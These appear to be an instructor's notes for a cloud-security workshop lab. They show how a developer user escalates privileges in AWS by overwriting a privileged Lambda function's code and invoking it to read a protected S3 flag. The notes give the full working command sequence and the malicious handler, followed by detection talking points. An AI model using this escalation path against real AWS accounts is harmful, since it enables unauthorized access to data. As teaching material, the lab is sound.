# Scenario 4 — Attack bullets (morning, ~15 min)

Source: Lab 1 Exercise 6. Identity: `iamws-lambda-developer-user`. Target: crown jewels via hijacking `iamws-privileged-lambda` (execution role = `iamws-privileged-lambda-role` with AdministratorAccess).

## Pre-attack — recon with iam-recon

- `iam-recon --account $ACCOUNT_ID pathfinding --principal user/iamws-lambda-developer-user` → primary recon for this scenario. Maps to pathfinding.cloud `[lambda-003]` / `[lambda-004]` (Existing PassRole via UpdateFunctionCode).
- `iam-recon --account $ACCOUNT_ID argquery --principal user/iamws-lambda-developer-user --action lambda:UpdateFunctionCode` → ALLOW line confirms unrestricted update.
- ⚠️ Note: `argquery --preset privesc` will **not** flag this. iam-recon's Lambda edge checker short-circuits at `iam:PassRole` (`src/edges/lambda.rs:79`) — since this user has `lambda:*` but no `iam:PassRole`, the existing-function path is skipped. Pathfinding catches it because it matches on dangerous permissions, not graph edges.

## Exploit — full command path

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-lambda-developer-user)

# Step 1: try the crown jewels → DENIED
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-lambda-developer-user
# expect: Forbidden

# Step 2: find the privileged Lambda
aws lambda list-functions \
  --query 'Functions[?starts_with(FunctionName, `iamws`)].{Name:FunctionName,Role:Role}' \
  --output table --profile iamws-lambda-developer-user
# note: iamws-privileged-lambda with iamws-privileged-lambda-role

# Step 3: confirm the target function's role
aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.Role' --output text \
  --profile iamws-lambda-developer-user

# Step 4: save original code hash for comparison
ORIGINAL_HASH=$(aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.CodeSha256' --output text \
  --profile iamws-lambda-developer-user)
echo "Original: $ORIGINAL_HASH"

# Step 5: write the malicious handler
mkdir -p /tmp/iamws-exploit
cat > /tmp/iamws-exploit/lambda_function.py << 'PYEOF'
import boto3
def handler(event, context):
    sts = boto3.client('sts')
    s3 = boto3.client('s3')
    identity = sts.get_caller_identity()
    bucket = f"iamws-crown-jewels-{identity['Account']}"
    obj = s3.get_object(Bucket=bucket, Key='flag.txt')
    return {
        'statusCode': 200,
        'identity': {'Arn': identity['Arn']},
        'crown_jewels': obj['Body'].read().decode('utf-8')
    }
PYEOF

# Step 6: package
cd /tmp/iamws-exploit && zip -j exploit.zip lambda_function.py && cd -

# Step 7: overwrite the function code
aws lambda update-function-code \
  --function-name iamws-privileged-lambda \
  --zip-file fileb:///tmp/iamws-exploit/exploit.zip \
  --profile iamws-lambda-developer-user

# Step 8: invoke → returns crown jewels via the privileged role
aws lambda invoke --function-name iamws-privileged-lambda \
  --payload '{}' /tmp/iamws-exploit/response.json \
  --profile iamws-lambda-developer-user

cat /tmp/iamws-exploit/response.json | jq .
# expect: identity = iamws-privileged-lambda-role, crown_jewels = the flag
```

## Demo bullets

- Highlight the asymmetry: developer never directly assumed the role, but their code now runs as it.
- In iam-recon's viz, show how the function's role inherits AdministratorAccess and the developer can reach it via the Lambda edge.
- Discuss CodeSha256 as a detection hook — instructor mentions IAM Spy / runtime monitoring will catch this in Lecture 2.
